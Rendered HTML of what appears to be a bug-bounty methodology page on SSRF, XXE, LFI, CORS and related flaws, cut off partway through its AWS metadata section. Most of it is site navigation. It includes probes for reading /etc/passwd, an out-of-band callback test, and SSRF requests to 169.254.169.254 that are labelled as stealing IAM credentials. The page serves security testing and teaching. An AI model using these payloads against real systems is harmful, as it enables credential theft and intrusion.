+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-file-text" viewBox="0 0 24 24"><path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"/><path d="M14 2v5a1 1 0 0 0 1 1h5M10 9H8M16 13H8M16 17H8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendices
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#51-server-side-request-forgery-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1 Server-Side Request Forgery (SSRF)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.1 Server-Side Request Forgery (SSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#511-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#512-cloud-metadata-endpoint-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.2 Cloud Metadata Endpoint Attacks
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#513-ssrf-filter-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.3 SSRF Filter Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#514-internal-port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.4 Internal Port Scanning
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#515-ssrf-feature-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.1.5 SSRF Feature Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#52-open-redirect" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.2 Open Redirect
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.2 Open Redirect">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#521-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.2.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#522-bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.2.2 Bypass Techniques
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#523-chaining-open-redirect" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.2.3 Chaining Open Redirect
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#53-xxe-xml-external-entity" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3 XXE (XML External Entity)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.3 XXE (XML External Entity)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#531-classic-file-read" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.1 Classic File Read
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#532-blind-xxe-oob-via-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.2 Blind XXE (OOB via DTD)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#533-xxe-via-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.3 XXE via File Upload
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#534-soap-endpoints" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.4 SOAP Endpoints
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#535-xxe-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.5 XXE → SSRF
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#536-xxe-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.3.6 XXE Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#54-local-file-inclusion--path-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4 Local File Inclusion / Path Traversal
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.4 Local File Inclusion &#x2f; Path Traversal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#541-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#542-filter-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4.2 Filter Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#543-lfi-to-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4.3 LFI to RCE
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#544-high-value-file-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.4.4 High-Value File Targets
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#55-host-header-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.5 Host Header Injection
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.5 Host Header Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#551-web-cache-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.5.1 Web Cache Poisoning
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#552-ssrf-via-host-header-routing" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.5.2 SSRF via Host Header Routing
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#56-http-request-smuggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.6 HTTP Request Smuggling
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.6 HTTP Request Smuggling">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#561-safe-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.6.1 Safe Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#57-cors-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.7 CORS Misconfiguration
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.7 CORS Misconfiguration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#571-reflected-origin" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.7.1 Reflected Origin
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#572-null-origin-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.7.2 Null Origin Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#573-subdomain-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        5.7.3 Subdomain Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-5-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 5 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="ssrf-xxe-open-redirect-lfi-cors">SSRF, XXE, Open Redirect, LFI, CORS<a class="headerlink" href="#ssrf-xxe-open-redirect-lfi-cors" title="Permanent link">&para;</a></h1>
+<p>Server-side vulnerabilities that reach past the application boundary — into internal networks, cloud infrastructure, local filesystems, and across origin trust. SSRF in cloud-hosted applications is one of the highest-impact vulnerability classes in bug bounty. AWS credential theft via metadata SSRF has produced some of the largest payouts ever recorded.</p>
+<hr />
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 19h1a1 1 0 0 1 1 1h7v2h-7a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1H2v-2h7a1 1 0 0 1 1-1h1v-2H4a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1h16a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1h-7zM4 3h16a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1m5 4h1V5H9zm0 8h1v-2H9zM5 5v2h2V5zm0 8v2h2v-2z"/></svg></span> <strong>5.1 SSRF</strong></p>
+<hr />
+<p>Detection, cloud metadata theft, filter bypass, internal port scanning, RCE chains.</p>
+<p><a href="#51-server-side-request-forgery-ssrf"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> SSRF</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22 12a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10M6 13h8l-3.5 3.5 1.42 1.42L17.84 12l-5.92-5.92L10.5 7.5 14 11H6z"/></svg></span> <strong>5.2 Open Redirect</strong></p>
+<hr />
+<p>Detection, bypass techniques, chaining with OAuth and SSRF for high impact.</p>
+<p><a href="#52-open-redirect"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Open redirect</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.89 3 1.96.4L11.11 21l-1.96-.4zm6.7 9L16 8.41V5.58L22.42 12 16 18.41v-2.83zM1.58 12 8 5.58v2.83L4.41 12 8 15.58v2.83z"/></svg></span> <strong>5.3 XXE</strong></p>
+<hr />
+<p>Classic file read, blind OOB, file upload vectors, SOAP, XXE→SSRF.</p>
+<p><a href="#53-xxe-xml-external-entity"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> XXE</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 20H4a2 2 0 0 1-2-2V6c0-1.11.89-2 2-2h6l2 2h7a2 2 0 0 1 2 2H4v10l2.14-8h17.07l-2.28 8.5c-.23.87-1.01 1.5-1.93 1.5"/></svg></span> <strong>5.4 LFI / Path Traversal</strong></p>
+<hr />
+<p>Traversal probes, filter bypass, log poisoning, PHP wrappers, RCE escalation.</p>
+<p><a href="#54-local-file-inclusion--path-traversal"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> LFI</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17.9 17.39c-.26-.8-1.01-1.39-1.9-1.39h-1v-3a1 1 0 0 0-1-1H8v-2h2a1 1 0 0 0 1-1V7h2a2 2 0 0 0 2-2v-.41a7.984 7.984 0 0 1 2.9 12.8M11 19.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.22.21-1.79L9 15v1a2 2 0 0 0 2 2m1-16A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2"/></svg></span> <strong>5.5 Host Header Injection</strong></p>
+<hr />
+<p>Cache poisoning, SSRF via routing, beyond password reset.</p>
+<p><a href="#55-host-header-injection"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Host header</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m21 9-4-4v3h-7v2h7v3M7 11l-4 4 4 4v-3h7v-2H7z"/></svg></span> <strong>5.6 Request Smuggling</strong></p>
+<hr />
+<p>CL.TE / TE.CL detection, safe probing, reporting standard.</p>
+<p><a href="#56-http-request-smuggling"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Smuggling</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 1c-2.76 0-5 2.24-5 5v2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12c1.11 0 2-.89 2-2V10a2 2 0 0 0-2-2h-1V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2h2V6c0-2.76-2.24-5-5-5m-8 12a2 2 0 0 1 2 2c0 1.11-.89 2-2 2a2 2 0 1 1 0-4"/></svg></span> <strong>5.7 CORS Misconfiguration</strong></p>
+<hr />
+<p>Reflected origin, null origin, subdomain bypass, credentialed fetch PoC.</p>
+<p><a href="#57-cors-misconfiguration"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> CORS</a></p>
+</li>
+</ul>
+</div>
+<hr />
+<h2 id="decision-flow">Decision Flow<a class="headerlink" href="#decision-flow" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>App accepts a URL parameter or has webhook/import features?
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>→ SSRF first. OOB callback via interactsh to confirm.
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Confirmed SSRF on a cloud-hosted app?
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>→ Try AWS metadata immediately: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>App accepts XML, has file upload, or has SOAP endpoints?
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>→ XXE. Basic file read first, blind OOB if nothing reflected.
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Found a ?next=, ?redirect=, ?url= parameter?
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>→ Open redirect. Spend 15 minutes trying to chain it before reporting standalone.
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>App uses file/path/template parameters for file operations?
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>→ Path traversal. ../../etc/passwd to confirm, then escalate.
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>API returns Access-Control-Allow-Origin header?
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>→ Test CORS. Send Origin: https://attacker.com with credentials.
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>App sits behind a load balancer or CDN?
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>→ Request smuggling candidate. Use HTTP Request Smuggler extension.
+</span></code></pre></div>
+<hr />
+<h2 id="51-server-side-request-forgery-ssrf">5.1 Server-Side Request Forgery (SSRF)<a class="headerlink" href="#51-server-side-request-forgery-ssrf" title="Permanent link">&para;</a></h2>
+<p>The server makes an HTTP request on behalf of the attacker. The attacker controls the URL. The server — which has access to internal network resources, cloud metadata, and services not publicly reachable — fetches attacker-specified URLs and returns or acts on the response.</p>
+<h3 id="511-detection">5.1.1 Detection<a class="headerlink" href="#511-detection" title="Permanent link">&para;</a></h3>
+<p><strong>Where SSRF inputs live:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Explicit URL parameters:
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  ?url=   ?redirect=   ?link=   ?src=   ?uri=
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>  ?path=  ?fetch=      ?load=   ?target=
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Webhook / integration features:
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>  &quot;Notify me at: https://my-server.com&quot;
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>  &quot;Slack webhook URL&quot;
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>  &quot;Send data to endpoint&quot;
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>Import / fetch features:
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>  &quot;Import from URL&quot;   &quot;Fetch profile picture from URL&quot;
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>  &quot;Add RSS feed&quot;      &quot;Import CSV from URL&quot;
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>PDF / document generation:
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>  HTML content with &lt;img src=&quot;https://...&quot;&gt;
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>  Header/footer URL fields
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>Image processing:
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>  Avatar URL field    OG image fetch    Link unfurl
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>XML / SOAP inputs:
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>  DOCTYPE, entity definitions, schema location URLs
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">ssrf_initial_probe.sh</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Start OOB listener:</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>interactsh-client<span class="w"> </span>-server<span class="w"> </span>interactsh.com
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># → Get URL: abc123.interactsh.com</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1"># Inject in every suspected parameter:</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>?url<span class="o">=</span>https://abc123.interactsh.com/ssrf-test
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>?webhook<span class="o">=</span>http://abc123.interactsh.com
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>?src<span class="o">=</span>http://abc123.interactsh.com
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="c1"># HTTP interaction received → SSRF confirmed</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="c1"># Note the source IP in the callback — reveals server&#39;s IP / internal range</span>
+</span></code></pre></div>
+<hr />
+<h3 id="512-cloud-metadata-endpoint-attacks">5.1.2 Cloud Metadata Endpoint Attacks<a class="headerlink" href="#512-cloud-metadata-endpoint-attacks" title="Permanent link">&para;</a></h3>
+<p><strong>The highest-impact SSRF target.</strong> Cloud metadata endpoints are accessible only from within the cloud instance. Confirmed SSRF on a cloud app → try these immediately.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:5"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><input id="__tabbed_1_5" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">AWS (IMDSv1)</label><label for="__tabbed_1_2">AWS (IMDSv2)</label><label for="__tabbed_1_3">GCP</label><label for="__tabbed_1_4">Azure</label><label for="__tabbed_1_5">Other</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">aws_metadata.sh</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># List available credential roles:</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>?url<span class="o">=</span>http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Steal the credentials (Critical finding):</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>?url<span class="o">=</span>http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="c1"># Returns: AccessKeyId, SecretAccessKey, Token → live AWS credentials</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="c1"># Other useful endpoints:</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>?url<span class="o">=</span>http://169.254.169.254/latest/meta-data/hostname
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>?url<span class="o">=</span>http://169.254.169.254/latest/user-data
